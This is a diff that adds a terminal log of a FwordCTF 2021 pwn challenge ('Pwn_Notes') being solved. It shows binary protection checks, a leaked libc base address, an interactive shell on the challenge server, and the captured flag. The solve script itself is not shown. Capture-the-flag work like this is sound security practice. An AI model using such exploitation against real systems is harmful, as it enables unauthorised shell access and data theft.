@@ -1,0 +1,27 @@
+mito@ubuntu:~/CTF/FwordCTF_2021/Pwn_Notes$ python solve.py r
+[*] '/home/mito/CTF/FwordCTF_2021/Pwn_Notes/task2'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 40.71.72.198 on port 1235: Done
+[*] '/home/mito/CTF/FwordCTF_2021/Pwn_Notes/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+libc_leak = 0x7f68364a6ca0
+libc_base = 0x7f68360bb000
+[*] Switching to interactive mode
+$ id
+uid=1000(fword) gid=1000(fword) groups=1000(fword)
+$ ls -l
+total 44
+-rw-rw-r-- 1 root root    46 Aug 27 17:23 flag.txt
+-rwxr-xr-x 1 root root 13320 Aug 27 17:56 task2
+-rw-rw-r-- 1 root root  3063 Aug 27 17:23 task2.c
+-rwxrwxr-x 1 root root 18744 Aug 27 17:23 ynetd
+$ cat flag.txt
+FwordCTF{i_l0V3_ru5tY_n0tEs_7529271026587478}
